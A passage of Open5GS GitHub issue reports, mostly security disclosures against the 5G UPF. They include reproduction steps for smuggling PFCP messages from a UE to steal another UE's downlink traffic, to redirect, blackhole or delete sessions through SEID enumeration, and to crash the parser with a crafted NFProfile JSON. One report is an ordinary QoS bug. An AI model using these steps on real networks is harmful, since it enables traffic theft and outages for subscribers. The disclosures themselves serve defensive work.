hash; the call site is the CreatePDR loop of the Session Establishment
handler (`src/upf/n4-handler.c:182`). The SMF is not affected by this root
cause — it does not accept PFCP Session Establishment Requests.

### Summary

`upf_sess_set_ue_ip()` installs a session's UE IP into `self.ipv4_hash` with
no check that the address is already owned by a different session, and
`ogs_pfcp_ue_ip_alloc()` succeeds for an address that is already in use. A
PFCP peer can therefore establish a **second, rival session whose PDI claims
another UE's IP address** (APN/DNN omitted). Both sessions now map
`10.45.0.3`; the hash points at the newest one, so every downlink packet
addressed to the victim UE is matched and forwarded by the **attacker's**
PDR/FAR instead of the victim's — a silent, complete traffic theft with
Cause-1 acknowledgements and no crash.

In our lab the N4 endpoint is reachable from the data plane (PFCP datagram as
the payload of an uplink IP packet over the attacker's own PDU session; the
gNB GTP-U-encapsulates it, the UPF decapsulates it onto its own N4 socket).

### Steps to reproduce

Scenario:
* Attacker UE: `10.45.0.2`, Sink for testing attack: `192.168.231.150:2152`.
* Benign peer UE: `10.45.0.3` (both attached, each
with a PDU session).
* UPF N4: `192.168.231.132:8805`
* N3: `192.168.231.132:2152`


1. From the attacker UE, smuggle a PFCP Association Setup Request (Node ID =
   `10.45.0.2`) to the UPF. Accepted with Cause 1.
2. Send a PFCP Session Establishment Request through the same path with:
   Create F-SEID (CP-SEID `0x9999`), PDN Type = IPv4, and one CreatePDR whose
   PDI sets Source Interface = CORE and carries a **UE IP Address IE equal to
   the peer UE's IP `10.45.0.3`** plus an F-TEID IE (CH=1), and one CreateFAR
   (FORWARD + Outer Header Creation GTP-U/UDP/IPv4 →
   `192.168.231.150:2152`, TEID `0xbeef`).
3. Send 10 ICMP probes from the attacker UE to `10.45.0.3` — their delivery
   to the peer UE is the downlink leg — and watch both the attacker sink and
   the peer UE.

### Logs (Attached)

[R4-upf-ueip-uniqueness-not-enforced.zip](https://github.com/user-attachments/files/31615307/R4-upf-ueip-uniqueness-not-enforced.zip)

The peer UE's legitimate session, then the attacker's rogue session claiming
the same IP — note the UPF logs **two live sessions with `IPv4[10.45.0.3]`**:

```shell
08/28 18:33:13.191: [upf] DEBUG: Added PFCP-Node: addr_list [10.45.0.2]:8805 (../open5gs-src/src/upf/pfcp-path.c:140)
08/28 18:33:13.191: [upf] INFO: PFCP associated [10.45.0.2]:8805 (../open5gs-src/src/upf/pfcp-sm.c:168)
08/28 18:33:15.308: [upf] INFO: [Added] Number of UPF-Sessions is now 3 (../open5gs-src/src/upf/context.c:212)
08/28 18:33:15.308: [upf] DEBUG: Session Establishment Request (../open5gs-src/src/upf/n4-handler.c:66)
08/28 18:33:15.308: [upf] INFO: UE F-SEID[UP:0x844 CP:0x9999] APN[(null)] PDN-Type[1] IPv4[10.45.0.3] IPv6[] (../open5gs-src/src/upf/context.c:498)
```

earlier in the same log:

```shell
08/28 18:32:51.565: [upf] INFO: UE F-SEID[UP:0xcf5 CP:0x27a] APN[internet] PDN-Type[1] IPv4[10.45.0.3] IPv6[] (../open5gs-src/src/upf/context.c:498)
```

Measured effect (`q003_sink_redirect.pcap` pkts 1–10; the same 10 probes are
visible entering the UPF on `capture-n3.pcap` pkts 21, 25, 27, 29, …, 41 and
leaving GTP-U-encapsulated toward the sink at pkts 22, 26, 28, 30, …, 42):
**10/10 downlink probes destined for `10.45.0.3` (inner ICMP
`10.45.0.2 -> 10.45.0.3`) arrive at the attacker sink GTP-U-encapsulated with
TEID `0xbeef`**; `capture-n3.pcap` also catches later victim-downlink traffic
being re-written to the sink with TEID `0xbeef` (pkts 50, 52, 54 — the echo
replies to the peer UE's own pings — and pkts 55–57 — data-network-side echo
probes); `capture-ue-victim.pcap` shows the peer UE received none of them
(pre-attack 0% loss → post-attack 100% loss).

### Expected behaviour

The UPF must reject a PDR whose UE IP address collides with the address of a
different live session (cause: request rejected / no resources available per
implementation policy) — address ownership must follow the SMF's assignment,
not whatever a PFCP peer claims in a PDI.

### Observed Behaviour

```c
/* src/upf/context.c — upf_sess_set_ue_ip() */
if (session_type == OGS_PDU_SESSION_TYPE_IPV4) {
    if (ue_ip->ipv4 || pdr->dnn) {
        sess->ipv4 = ogs_pfcp_ue_ip_alloc(&cause_value, AF_INET,
                        pdr->dnn, (uint8_t *)&(ue_ip->addr));
        ...
        ogs_hash_set(self.ipv4_hash, sess->ipv4->addr, OGS_IPV4_LEN, sess);
        /* <- unconditional last-write-wins; no "already owned by
              another session" check anywhere before this point */
    }
}
```

`ogs_pfcp_ue_ip_alloc()` allocates from the (DNN-keyed) subnet pool and does
not consult `self.ipv4_hash` for foreign ownership — with `pdr->dnn == NULL`
the rogue establishment happily receives the victim's address. The call site
(`src/upf/n4-handler.c:182`, in the CreatePDR loop of the Establishment
handler) never compares against other sessions either.

Two related hazards in the same function: on session removal
(`src/upf/context.c`, `upf_sess_remove()`) the code unconditionally frees
`sess->ipv4` and nulls the hash entry, so a removal of *either* session
corrupts the other's address state.

### eNodeB/gNodeB

UERANSIM

### UE Models and versions

UERANSIM

items.title: [Bug]: SMF leaks QoS flows in `sess->bearer_list` when SmPolicyDecision is treated as full-state replacement; violates TS 23.503 §6.1.3.2.4 mandate to delete QoS Flow when last PCC rule is removed

labels.name: type:bug
labels.description: Open5GS bug

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
## Open5GS Release, Revision, or Tag

`v2.7.7` + 6 commits ahead of upstream main (commit `288f1ca49`). Reproduced with the `npcf-handler.c` and `binding.c` paths unchanged from upstream. Observed under heavy IMS workload (P-CSCF→PCF N5 PolicyAuthorization, multiple AppSessions per PDU session over time).

## Summary

`update_authorized_pcc_rule_and_qos()` in `src/smf/npcf-handler.c` rebuilds `sess->policy.pcc_rule[]` from scratch on every `SmPolicyDecision` notify (Create/Update/Delete), zeroing all prior entries. This treats the notify as **full-state replacement**, which contradicts TS 23.503 §6.1.3.2.2 — the PCF only includes PCC rules being **added, modified, or removed** in a notify; rules absent from the message remain authorized.

Downstream consequence: when a per-AppSession DELETE-notify races with a subsequent CREATE/UPDATE-notify (very common under IMS call churn), the rule the DELETE-notify wants to REMOVE has already been wiped from `policy.pcc_rule[]` by the rebuild. SMF logs `QosFlow[Id:%s] has already been removed` (`src/smf/binding.c:756-758`) and **does not delete the QoS Flow** — directly violating the normative *"the SMF shall delete the QoS Flow"* mandate of TS 23.503 §6.1.3.2.4.

The orphaned QoS flow stays in `sess->bearer_list` indefinitely. Because `OGS_MAX_NUM_OF_BEARER` is 4 in `lib/proto/types.h`, the bearer list fills after a small number of churned AppSessions; the next call requesting two flows (audio + video medComponents) hits `ogs_error("QosFlow Overflow[%d]", ...)` at `src/smf/binding.c:547`, the second flow never installs, and from the UE's perspective the call dies with `580 Precondition Failure` (no 5QI=2 video bearer authorized).

## Spec citations (TS 23.503 v18.10.0)

**§6.1.3.2.2 Session binding** — SmPolicyDecision is delta-based:
> *"Once it has determined the impacted PDU Session, the PCF shall identify the PCC rules affected by the AF session information, **including new PCC rules to be installed and existing PCC rules to be modified or removed**."*

**§6.1.3.2.4 QoS Flow binding** — SMF must delete the QoS Flow when last PCC rule is removed:
> *"When the PCF removes a PCC Rule, the SMF shall remove the association of the PCC Rule to the QoS Flow. **If the last PCC rule that is bound to a QoS Flow is removed, the SMF shall delete the QoS Flow.**"*

**§6.1.3.13 Resource sharing for different AF sessions** — AF session termination triggers PCC rule removal:
> *"The AF session termination or modification procedure that removes media flows triggers the removal of the corresponding PCC rules from the SMF."*

## Steps to reproduce

Any deployment with frequent SmPolicyDecision UpdateNotify churn will reproduce this. We hit it consistently with an IMS workload (Kamailio P-CSCF speaking standard N5 PolicyAuthorization to Open5GS PCF):

1. Two registered IMS UEs, both with PCC rules in MongoDB for 5QI=1 (voice) and 5QI=2 (video).
2. Place a video call (audio + video medComponents in the SDP). P-CSCF creates an AppSession at PCF (`POST /npcf-policyauthorization/v1/app-sessions`).
3. PCF emits `SmPolicyDecision` UpdateNotify to SMF with two PCC rule INSTALLs (IDs like `<dbId>-a<appSessId>`, generated at `src/pcf/npcf-handler.c:946` as `ogs_msprintf("%s-a%s", db_pcc_rule->id, app_session->app_session_id)`).
4. End the call. P-CSCF DELETEs the AppSession at PCF.
5. PCF emits a second UpdateNotify with NULL-valued `PccRuleMap` entries (REMOVE) for those rule IDs.
6. Repeat steps 2–5 several times. SMF eventually logs:
   ```
   ERROR: QosFlow Overflow[4] (../src/smf/binding.c:547)
   WARNING: QosFlow[Id:ims-n2-a85] has already been removed. (../src/smf/binding.c:757)
   WARNING: QosFlow[Id:ims-n2-a84] has already been removed. (../src/smf/binding.c:757)
   ```

## Expected behavior

Per TS 23.503 §6.1.3.2.2, an SmPolicyDecision update is a **delta** over the current authorized set. PCC rules NOT mentioned in a notify should remain unaffected. PCC rules in the notify with NULL value should be REMOVED, and per §6.1.3.2.4 the corresponding QoS Flow should be deleted if it had no other PCC rule bound to it.

## Actual behavior

`update_authorized_pcc_rule_and_qos()` in `src/smf/npcf-handler.c` zeroes the entire policy table on every notify:

```c
if (SmPolicyDecision->pcc_rules) {
    /* … */
    for (i = 0; i < sess->policy.num_of_pcc_rule; i++)
        OGS_PCC_RULE_FREE(&sess->policy.pcc_rule[i]);
    sess->policy.num_of_pcc_rule = 0;

    OpenAPI_list_for_each(SmPolicyDecision->pcc_rules, node) {
        /* rebuild policy.pcc_rule[] from scratch from the new map */
    }
}
```

Then `smf_qos_flow_binding(sess)` (called by the SmPolicyControl create/update handler) iterates the rebuilt `policy.pcc_rule[]`. For TYPE_REMOVE entries it does:

```c
qos_flow = smf_qos_flow_find_by_pcc_rule_id(sess, pcc_rule->id);
if (!qos_flow) {
    ogs_warn("No need to send 'Session Modification Request'");
    ogs_warn("  - QosFlow[Id:%s] has already been removed.", pcc_rule->id);
    continue;
}
```

If the DELETE-notify arrives after a subsequent CREATE-notify (the rebuild already happened), the rule the DELETE-notify wants to REMOVE is no longer in policy.pcc_rule[] — but the corresponding entry in `sess->bearer_list` is **never reaped**, because `bearer_list` is keyed by `qos_flow->pcc_rule.id`, not by what's in `policy.pcc_rule[]`. The qos_flow stays orphaned.

Eventually:

```c
if (ogs_list_count(&sess->bearer_list) >= OGS_MAX_NUM_OF_BEARER) {
    ogs_error("QosFlow Overflow[%d]", ogs_list_count(&sess->bearer_list));
    continue;   /* the new flow is never created */
}
```

with `OGS_MAX_NUM_OF_BEARER = 4` (`lib/proto/types.h:32`).

For the new INVITE that triggered this, the audio/video medComponents either land short (only audio installs, video is dropped) or both are dropped — the term UE sees the QoS preconditions fail and returns `580 Precondition Failure`.

## Why the race window exists

PCC rule IDs in `src/pcf/npcf-handler.c:946` are formed as `<dbId>-a<appSessId>`, so each call generates unique rule IDs. Concurrent or rapidly-sequential AppSession lifecycle events arrive at SMF as separate `SmPolicyDecision` notifies. Each notify rebuilds the policy table before processing its own contents, so a late-arriving DELETE-notify for AppSession N can find that policy.pcc_rule[] no longer contains its rule (it was wiped by the CREATE-notify for AppSession N+1).

## Proposed fix

Two paths, ordered by spec-cleanness:

**Cleanest (spec-aligned):** treat `SmPolicyDecision.pcc_rules` as an incremental delta. Don't zero `policy.pcc_rule[]`. Walk the incoming map: entries with non-NULL value INSTALL/MODIFY (replacing or adding to the existing policy table); entries with NULL value REMOVE. Rules already in the table that are absent from the notify stay unchanged. This brings `update_authorized_pcc_rule_and_qos()` into compliance with TS 23.503 §6.1.3.2.2.

**Less invasive (still compliant):** keep the rebuild loop, but BEFORE wiping, snapshot the current `policy.pcc_rule[]`. After rebuild, walk `sess->bearer_list` — for any qos_flow whose `pcc_rule.id` is in the snapshot but not in the new `policy.pcc_rule[]` AND was not explicitly REMOVED in the notify, emit a synthesized REMOVE entry. (My team attempted a variant of this without the snapshot/explicit-REMOVE distinction; the naive form misidentifies static IMS PCC rules — `ims-n1`, `ims-n2`, provisioned at PDU-session-create time and not present in per-call AppSession notifies — as orphans, leading to over-reaping. The snapshot approach avoids this by only acting on rules that were transiently authorized.)

Separately, `OGS_MAX_NUM_OF_BEARER = 4` in `lib/proto/types.h:32` is conservative even without a leak — TS 23.501 §5.7.1.1 places no explicit per-PDU-session cap below the QFI bit-width ceiling of 64, and only Unstructured-type PDU sessions have the explicit "*maximum one 5G QoS Flow per PDU Session*" restriction (§5.7.3). We've bumped it to 16 locally as a stopgap; suggest bumping upstream to a more realistic value (e.g. 16 or 32) regardless of how the leak is fixed, with proportional bumps to `OGS_MAX_NUM_OF_PCC_RULE` and `OGS_BEARER_PER_UE`.

## Related (existing) reports

- Issue [#869](https://github.com/open5gs/open5gs/issues/869) — VoLTE multi-bearer with call-hold breakage. Same class of failure (second dedicated bearer goes missing under multi-call churn). Closed `Housekeeping:ToClose` without confirmed fix.
- Issue [#4233](https://github.com/open5gs/open5gs/issues/4233) — SGW-C bearer pool exhaustion crash. Marked `status:already-fixed` for SGW-C; SMF still asserts/overflows.
- Discussion [#2631](https://github.com/open5gs/open5gs/discussions/2631) — SMF crash on multiple PDU session release. Same race-condition class on the AppSession lifecycle. Unanswered since 2023.
- Issue [#2115](https://github.com/open5gs/open5gs/issues/2115) — `smf_npcf_smpolicycontrol_build_delete: Assertion sess->sm_context_ref failed`. Same race-condition class.

Happy to provide additional logs (full SMF/PCF/SCP traces during reproduction) or a minimal reproducing test case if useful. Also have local diffs of the two fix paths described above (the conservative one is already running on our deployment) — can submit as a PR if maintainers prefer.

items.body:
### Open5GS Release, Revision, or Tag

v2.8.0

### Steps to reproduce

`OpenAPI_nf_profile_parseFromJSON()` aborts the whole process when it parses an
NFProfile whose `nfSetRecoveryTimeList` (or `serviceSetRecoveryTimeList`) is a
**non-empty** object. Both are `map<string, DateTime>` per TS 29.510. Because th
NFProfile is parsed from peer/NRF input (NF registration, NF discovery responses
NRF replication), this is remotely triggerable → DoS.

**Minimal triggering body** (Content-Type `application/json`), as handed to
`ogs_sbi_parse_response()` / `OpenAPI_nf_profile_parseFromJSON()`:

```json
{
  "nfInstanceId": "3fa85f64-5717-4562-b3fc-2c963f66afa6",
  "nfType": "AMF",
  "nfStatus": "REGISTERED",
  "nfSetRecoveryTimeList": { "setId-1": "2026-01-01T00:00:00.000Z" }
}
```

`serviceSetRecoveryTimeList` triggers the same crash. The same code-generation
defect also affects `allowedOperationsPerNfType` / `allowedOperationsPerNfInstan
in `NFService` (`map<string, array<string>>`).

**Via the existing fuzzer:**

```sh
# crashes immediately
./build/tests/fuzzing/sbi_nf_profile_fuzz <(printf '%s' \
  '{"nfInstanceId":"x","nfType":"AMF","nfStatus":"REGISTERED",'\
  '"nfSetRecoveryTimeList":{"a":"2026-01-01T00:00:00Z"}}')
```

**Root cause:** in `lib/sbi/support/<rel>/openapi-generator/templates/model-body
the map value-type dispatch in `parseFromJSON` only emits a
`OpenAPI_map_create(...)` for `isString` / `isByteArray` / `isNumeric` /
`isBoolean`. For a `DateTime` value (`isDateTime`, not `isString`) or an array
value, no branch runs, so `localMapKeyPair` stays `NULL` and the generated code
calls `OpenAPI_list_add(list, NULL)` → `listEntry_create(NULL)` →
`ogs_assert(data)` → `abort()`. `convertToJSON` has the matching gap and also
silently drops these map values.



### Logs

```shell
FATAL: listEntry_create: Assertion `data' failed. (../lib/sbi/openapi/src/list.c
FATAL: backtrace() returned 13 addresses (../lib/core/ogs-abort.c:37)

==ERROR: UndefinedBehaviorSanitizer: ABRT on unknown address 0x0539000000f8
    #2 ogs_abort                            lib/core/ogs-abort.c:47
    #3 listEntry_create                     lib/sbi/openapi/src/list.c:10
    #4 OpenAPI_list_add                     lib/sbi/openapi/src/list.c:116
    #5 OpenAPI_nf_profile_parseFromJSON     lib/sbi/openapi/model/nf_profile.c:3
    #6 parse_json                           lib/sbi/message.c:1831
    #7 ogs_sbi_parse_response               lib/sbi/message.c:1347
    #8 LLVMFuzzerTestOneInput               tests/fuzzing/sbi-nf-profile-fuzz.c:


Reduced standalone reproduction against the unpatched tree:


ABORT: assert(data) src/list.c:10
Aborted (exit 134 / SIGABRT)
```

### Expected behaviour

A populated `nfSetRecoveryTimeList` / `serviceSetRecoveryTimeList` is parsed
correctly (and re-serialized correctly). Any value type the generator does not
yet support is rejected with a parse error (`return NULL`), never an
`abort()` of the process.


### Observed Behaviour

`ogs_assert(data)` fails inside `listEntry_create()` and the NF aborts
(SIGABRT) — a remotely triggerable denial of service, since the offending field
arrives in untrusted NFProfile input.



### eNodeB/gNodeB

_No response_

### UE Models and versions

_No response_

items.body:
### Open5GS Release, Revision, or Tag

v2.8.0 (main @ `ee596937d`, v2.8.0-76)

### Security impact

Any associated peer (in practice: any registered UE, via the data-plane
delivery path) can, with one well-formed message per session and Cause-1
acknowledgements (no crash, no malformed input):

- **redirect or blackhole** the downlink of **every** live PDU session on the
  UPF (modification variant: UpdateFAR FORWARD + Outer Header Creation, or
  Apply Action = DROP), or
- **destroy any live PDU session** on the UPF (deletion variant: total
  user-plane DoS per session, GTP-U Error Indications to the RAN, and
  permanent CP/UP state desynchronization — the SMF continues operating on a
  session that no longer exists).

This is a full confidentiality/integrity/availability break of the user plane.

**CVSS v3.1 Score: 8.8 (High)** - AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

### Affected components

The **UPF** only — its N4 session dispatch. Inbound Session Modification and
Session Deletion Requests are resolved from the header SEID alone
(`upf_sess_find_by_upf_n4_seid()`, `src/upf/pfcp-sm.c:197`), the handlers
(`src/upf/n4-handler.c:243` modification, `src/upf/n4-handler.c:447`
deletion) only check that the session exists, the UpdateFAR applier
(`ogs_pfcp_handle_update_far`, `lib/pfcp/handler.c:1299`) applies
rebind/redirect/DROP with no ownership check, and session removal
(`src/upf/context.c:256`) never notifies the owning CP function. The SMF is
not affected by this root cause.

### Summary

For inbound PFCP Session Modification and Session Deletion Requests, the UPF
resolves the target session from the **header SEID alone** and never verifies
that the PFCP peer that sent the request is the one that owns the session.
This is one root cause with two impact variants:

- **Modification** — once a peer is associated (see the unauthenticated-association
  issue), it can modify **any** live session: re-bind the victim's FAR with Outer
  Header Creation to redirect the victim's downlink to the attacker, or set
  Apply Action = DROP to blackhole it.
- **Deletion** — it can delete **any** live PDU session with a single well-formed
  message: the UPF answers Cause 1 (Request accepted), destroys the session
  context, and never notifies the SMF. The SMF keeps the session in its own
  state indefinitely (CP/UP desync), the UPF sends GTP-U Error Indications to
  the gNB for the invalidated tunnel, and all user-plane traffic for the victim
  UE fails (100% packet loss).

Both variants use well-formed messages, get Cause 1 (Request accepted)
responses, and cause no crash.

In our lab the N4 endpoint is reachable from the data plane (PFCP datagram as
the payload of an uplink IP packet over the attacker's own PDU session; the
gNB GTP-U-encapsulates it, the UPF decapsulates it onto its own N4 socket).

### Steps to reproduce

**Variant A — cross-association session modification (multi-UE lab).**
Attacker UE `10.45.0.2`, benign peer UE `10.45.0.3` (both attached, each with
a PDU session). UPF N4 `192.168.231.132:8805`, N3 `192.168.231.132:2152`,
gNB `192.168.231.140:2152`, attacker sink `192.168.231.150:2152`.

1. From the attacker UE, smuggle a PFCP Association Setup Request (Node ID =
   `10.45.0.2`) to `192.168.231.132:8805` through the PDU session. UPF answers
   Cause 1.
2. Read the peer UE's UP-SEID from the UPF log
   (`UE F-SEID[UP:0xfa0 CP:0xd2] ... IPv4[10.45.0.3]`). The UP-SEID is a small
   value from a bounded, enumerable pool.
3. Send a Session Modification Request with header SEID `0xfa0` and one
   UpdateFAR IE:

   | Field | Value (blackhole variant) |
   |---|---|
   | Header SEID | `0xfa0` (peer UE's UP-SEID) |
   | UpdateFAR (IE 10) | FAR ID 1, Apply Action = DROP (`0x0100`), no Update Forwarding Parameters |

   For the redirection variant, use Apply Action = FORWARD (`0x0200`) with an
   Update Forwarding Parameters containing Outer Header Creation
   (GTP-U/UDP/IPv4 → `192.168.231.150:2152`, TEID `0xbeef`).
4. Measure downlink delivery to the peer UE (`10.45.0.3`) before / during /
   after, from the data-network side and UE-to-UE.

**Variant B — cross-association session deletion (single-UE lab).**
Attacker UE `10.45.0.2` (attached, one PDU session), UPF N4
`192.168.230.132:8805`, N3 `192.168.230.132:2152`, gNB `192.168.230.140:2152`.

1. Attach the UE through the 5GC. The SMF-established session gets
   UP-SEID `0x686` (1670) / CP-SEID `0xee` (read from the UPF log).
2. From the attacker UE, send a PFCP Association Setup Request (Node ID =
   `10.45.0.2`) to `192.168.230.132:8805` through the PDU session. UPF answers
   Cause 1.
3. Send a series of PFCP Session Deletion Requests through the same path,
   stepping the PFCP header SEID over candidate values: 1..10, 0x684, 0x685,
   0x687, 0x688, 0x686. Each miss is answered with Cause 65 (which also
   confirms which SEIDs exist); the hit destroys the session.
4. After the deletion, ping through the victim session and watch the SMF logs.

### Logs (Attached)

[R2-upf-cross-association-session-modification-deletion.zip](https://github.com/user-attachments/files/31614946/R2-upf-cross-association-session-modification-deletion.zip)

**Variant A — modification.** The whole chain, attacker peer `10.45.0.2` vs.
the SMF peer `192.168.231.133`:

```shell
[upf] DEBUG: Merged PFCP-Node: addr_list [10.45.0.2]:8805 (../open5gs-src/src/upf/pfcp-path.c:161)
[upf] DEBUG: Session Modification Request (../open5gs-src/src/upf/n4-handler.c:258)   # attributed to peer [10.45.0.2]:8805
[upf] INFO: UE F-SEID[UP:0xfa0 CP:0xd2] APN[internet] PDN-Type[1] IPv4[10.45.0.3] IPv6[] (../open5gs-src/src/upf/context.c:498)
```

`capture-n4.pcap` (DROP variant): SEIDs 1–8, 0xf9c–0xf9f, 0xfa1–0xfa4 answered
`Cause=65`; **SEID 0xfa0 answered `IE19 Cause=1 (Request accepted)`** — the
request came from peer `10.45.0.2:8805`, while the session's owning peer is
the SMF (`192.168.231.133:8805`). The response's SEID field is `0xd2` — the
victim's CP F-SEID, leaked to the attacker.

Measured effect (pcap-counted, two independent paths):

```text
N6 (data-network -> 10.45.0.3):  baseline 5/5 replies -> DROP active 5 req / 0 replies
UE-to-UE:                        baseline 5/5 -> DROP active 0/5
peer UE tun:                     completely silent during the drop window
restore (UpdateFAR FORW, same SEID 0xfa0): Cause 1 -> 5/5 replies again
```

Redirection variant (UpdateFAR FORWARD + OHC TEID `0xbeef` on the other
victim's SEID `0x700`): `ohc_redirect_capture.pcap` contains 3 UPF-originated
GTP-U packets `192.168.231.132:2152 -> 192.168.231.150:2152`, outer TEID
`0xbeef`, inner ICMP `10.45.0.2 -> 10.45.0.3` — the victim's downlink path
re-written to the attacker's sink; peer delivery 3/3 before, 0/3 after.

**Variant B — deletion.** The live session before the attack, then the deletion
burst (14 candidate SEIDs → Cause 65), the accepted hit, the UPF session
count, the SMF silence, and the post-deletion Error Indications:

```shell
08/28 14:09:18.950: [upf] INFO: [Added] Number of UPF-Sessions is now 1 (../open5gs-src/src/upf/context.c:212)
08/28 14:09:18.950: [upf] DEBUG: Session Establishment Request (../open5gs-src/src/upf/n4-handler.c:66)
08/28 14:09:18.950: [upf] INFO: UE F-SEID[UP:0x686 CP:0xee] APN[internet] PDN-Type[1] IPv4[10.45.0.2] IPv6[] (../open5gs-src/src/upf/context.c:498)
08/28 14:09:25.316: [upf] DEBUG: Session Deletion Request (../open5gs-src/src/upf/n4-handler.c:456)   # SEIDs 1..10, 0x684, 0x685, 0x687, 0x688 -> each answered Cause 65 "Session context not found"
08/28 14:09:33.096: [upf] DEBUG: Session Deletion Response (../open5gs-src/src/upf/n4-build.c:130)    # SEID 0x686 -> Cause 1 "Request accepted" + CP-SEID 0xee echoed back + Usage Report IE
08/28 14:09:33.096: [upf] INFO: [Removed] Number of UPF-sessions is now 0 (../open5gs-src/src/upf/context.c:256)
08/28 14:09:34.151: [upf] ERROR: [192.168.230.132] Send Error Indication [TEID:0x7f11] to [192.168.230.140] (../open5gs-src/src/upf/gtp-path.c:412)
```

`capture-n4.pcap` pkts 41–42: Session Deletion Request for SEID `0x686` from
`10.45.0.2:8805` → Session Deletion Response with `Cause=1 (Request accepted)`.
The session's owning peer is the SMF (`192.168.230.133:8805`); the deleting
peer is the UE address.

`logs/open5gs/smf.log` (14:09:18 – 14:09:42): no N4 session release and no SM
signalling at all — the SMF never learns that the UPF destroyed its session.

Post-deletion connectivity check: 100% packet loss.

### Expected behaviour

The UPF must check that the PFCP node that sent the Session Modification or
Session Deletion Request is the node that owns the session (the session's
recorded peer / F-SEID address). A request from a different association must
be answered with `Session context not found` (cause 65) and must not change
state. If a session is legitimately deleted, the UPF must notify the owning
CP function so it can clean up its own state.

### Observed Behaviour

Both message types dispatch through the same session lookup, which uses the
header SEID only — there is no comparison against the requesting node anywhere
downstream:

```c
/* src/upf/pfcp-sm.c — upf_pfcp_state_associated() */
if (message->h.seid_presence && message->h.seid != 0)
    sess = upf_sess_find_by_upf_n4_seid(message->h.seid);   /* <- header SEID only */
    ...
    case OGS_PFCP_SESSION_MODIFICATION_REQUEST_TYPE:
        upf_n4_handle_session_modification_request(...);
    case OGS_PFCP_SESSION_DELETION_REQUEST_TYPE:
        upf_n4_handle_session_deletion_request(
            sess, xact, &message->pfcp_session_deletion_request);
```

**Modification path.** The handler's only check is `!sess`; after that the
request is applied from any peer:

```c
/* src/upf/n4-handler.c — upf_n4_handle_session_modification_request() */
if (!sess) {
    ogs_error("No Context");
    ogs_pfcp_send_error_message(xact, 0,
            OGS_PFCP_SESSION_MODIFICATION_RESPONSE_TYPE,
            OGS_PFCP_CAUSE_SESSION_CONTEXT_NOT_FOUND, 0);   /* cause 65, only when SEID is unknown */
    return;
}
/* then applies CreatePDR/UpdatePDR/UpdateFAR/... from the request */
```

The UpdateFAR handler (`lib/pfcp/handler.c`, `ogs_pfcp_handle_update_far`)
applies FAR-ID rebind, Apply Action (FORWARD/DROP) and Outer Header Creation
without any ownership check.

**Deletion path.** The handler's only check is likewise `!sess`; the deletion
is executed and acknowledged to ANY peer:

```c
/* src/upf/n4-handler.c — upf_n4_handle_session_deletion_request() */
if (!sess) {
    ogs_error("No Context");
    ogs_pfcp_send_error_message(xact, 0,
            OGS_PFCP_SESSION_DELETION_RESPONSE_TYPE,
            OGS_PFCP_CAUSE_SESSION_CONTEXT_NOT_FOUND, 0);
    return;
}
upf_pfcp_send_session_deletion_response(xact, sess);   /* cause 1 to ANY peer */
```

Nothing downstream compares `xact`'s source address with the session's owning
node, and nothing notifies the SMF when the context is removed
(`src/upf/context.c:256` frees the session, clears the UE-IP/SEID hashes and
returns without any CP notification).

The enumeration is easy: the UP-SEID pool is bounded, misses are answered
with a cause (which also confirms candidate SEIDs), and the UPF log prints
every live session's UP-SEID.

### eNodeB/gNodeB

UERANSIM

### UE Models and versions

UERANSIM

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.8.0 (main @ `ee596937d`, v2.8.0-76). Source verified at the pinned HEAD
(`git status` clean); reproduced twice in independent lab runs.

### Security impact

One well-formed message (valid PFCP encoding, one semantically invalid IE) erases the entire forwarding state of any live PDU session on the UPF: total user-plane DoS per session (uplink and downlink), GTP-U Error Indications to the RAN, persistent until the UE re-establishes — with the SMF and the UE unaware (no crash, no malformed input, no control-plane teardown). Any associated peer (in practice: any registered UE, via the data-plane delivery path) can do this per message, and the legitimate SMF self-inflicts the same wipe on any of its own rejected modifications. The trigger is generic: any rejected update in the session-modification handler reaches the same cleanup, not only the invalid Outer Header Creation shown here.

**CVSS v3.1 Score: 6.5 (Medium)** - AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H

### Affected components

The **UPF** only — its Session Modification error path. The `cleanup:` label of `upf_n4_handle_session_modification_request()`
(`src/upf/n4-handler.c:440-445`) calls `ogs_pfcp_sess_clear(&sess->pfcp)`, (`lib/pfcp/context.c:1283`) before the rejection is answered, erasing all PDRs/FARs/URRs/QERs of the resolved session. The SMF is not affected by this root cause — it does not accept PFCP Session Modification Requests (it only sends them).

### Summary

For an inbound PFCP Session Modification Request, the UPF resolves the target session from the **header SEID alone** (see the separate cross-association report) and then, when it must **reject** any part of the update — e.g. an unsupported Outer Header Creation description, answered `Cause 76 (Service not supported)` with Offending-IE — the handler's error-cleanup path calls
`ogs_pfcp_sess_clear(&sess->pfcp)` **before sending the error response**. That call removes **all** PDRs, FARs, URRs and QERs of the resolved session, not just the rejected update.

The result is an enforced, silent denial of service from one well-formed message: the victim session's entire forwarding state is erased, all user-plane traffic for that session blackholes (UL and DL), the UPF emits GTP-U Error Indications for the dead tunnel — while the SMF and the UE still believe the PDU session is up (no release, no modify on the control plane).

Note this is **independent of peer ownership**: the destruction happens on the rejection path, so even the legitimate SMF triggering any rejected modification on its own session wipes it. A peer-ownership check (the fix for the accepted-path cross-association issues) does **not** fix this defect.

In our lab the N4 endpoint is reachable from the data plane (PFCP datagram as the payload of an uplink IP packet over the attacker's own PDU session; the gNB GTP-U-encapsulates it, the UPF decapsulates it onto its own N4 socket).

### Steps to reproduce

Lab: 
* Attacker UE `10.45.0.2`
* Benign peer UE `10.45.0.3` (both attached, each with a PDU session)
* UPF N4 `192.168.232.132:8805`
* gNB/N3 `192.168.232.140:2152`
* SMF `192.168.232.133`.

1. Measure baseline downlink delivery to `10.45.0.3` from the data-network
   side (ICMP echo): 5/5 replies.
2. From the attacker UE, smuggle a PFCP Association Setup Request (Node ID =
   `10.45.0.2`) to the UPF through the PDU session. UPF answers Cause 1.
3. Read the peer UE's UP F-SEID from the UPF log
   (`UE F-SEID[UP:0x6ab CP:0x444] ... IPv4[10.45.0.3]`) and confirm it is live
   with one no-op Session Modification Request (header SEID `0x6ab`, no IEs)
   — answered Cause 1 via the success path.
4. Send exactly **one** Session Modification Request, header SEID `0x6ab`,
   carrying one UpdateFAR IE (FAR ID 1, Apply Action = FORWARD) whose Update
   Forwarding Parameters contain exactly one Outer Header Creation IE with a
